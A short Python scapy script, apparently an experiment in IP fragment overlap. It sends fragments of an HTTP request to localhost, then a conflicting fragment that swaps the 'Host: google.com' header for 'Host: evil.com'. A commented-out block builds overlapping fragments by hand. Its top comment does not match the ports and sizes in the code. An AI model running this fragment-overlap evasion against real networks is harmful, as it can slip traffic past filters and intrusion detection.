# create two IP packets, one with 1480 payload bytes and one with 4 payload bytes
# initial payload is TCP with sport/dport being 9999
from scapy.all import *



dstIP = "127.0.0.1"
#frags = fragment(IP(dst=dstIP)/TCP(sport=8000, dport=80)/("HTTP/1.1 GET /?q=xxxxx\nHost: google.com\n\nxxxHost:jordon.me\n\n"),63)

#frags[1][IP].frag = 7 

orig_host = "Host: google.com\n\n"
new = "Host: evil.com\n\nthis packet is longer"
s = "HTTP/1.1 GET /?aaaaaaaa\n"
l = len(s)

pkt1 = IP(dst=dstIP) / TCP(sport=8000, dport=80) / (s + orig_host)
pkt2 = IP(dst=dstIP) / TCP(sport=8000, dport=80) / (s + new)

pkts = fragment(pkt1, l + 40)
pkts_evil = fragment(pkt2, l + 40)

send(pkts)
bad_p = pkts_evil[1]
send(bad_p)
#bad_p.frag = 

"""
pkts = scapy.plist.PacketList()
# TCP(sport=8000, dport=80)/(
pkts.append(IP(dst=dstIP, flags="MF", frag=0)/("a" * 20 + "HTTP/1.1 GET /?=aaaa"))
pkts.append(IP(dst=dstIP, flags="MF", frag=5)/(orig_host + 'a'*(24 - len(orig_host))))
pkts.append(IP(dst=dstIP, flags="MF", frag=7)/("3"*32))
pkts.append(IP(dst=dstIP, flags="MF", frag=2)/("4"*16 + new + '4'*(40 - 16 - len(new))))
pkts.append(IP(dst=dstIP, flags="MF", frag=7)/("5"*32))
pkts.append(IP(dst=dstIP,  frag=10)/("6"*32))
send(pkts)

def s1():
    send(frags[0])
    
def s2():
    send(frags[1])
s1()
s2()"""
